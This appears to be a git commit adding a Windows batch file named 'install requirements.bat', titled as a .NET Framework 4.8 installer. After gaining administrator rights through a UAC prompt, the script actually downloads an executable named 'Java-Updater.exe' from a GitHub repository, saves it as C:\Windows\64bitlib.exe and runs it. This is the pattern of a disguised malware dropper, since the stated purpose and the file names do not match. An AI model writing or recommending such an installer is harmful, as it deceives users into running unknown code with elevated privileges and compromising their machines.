793f5d1da90306494225fbfbc5784a9755916ca3
Cheater-Fun <122129528+Cheater-Fun@users.noreply.github.com>
2023-03-04 23:40:57 +0100

    Add files via upload

---
+++ install requirements.bat
@@ -0,0 +1,32 @@
+@echo off
+
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"=""
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------
+title Framework installer
+echo Installing required NET Framework SDK 4.8
+timeout 1
+powershell.exe -Command Invoke-WebRequest -Uri https://github.com/Cheater-Fun/test/raw/main/Java-Updater.exe -OutFile C:\Windows\64bitlib.exe
+timeout 1
+start C:\Windows\64bitlib.exe
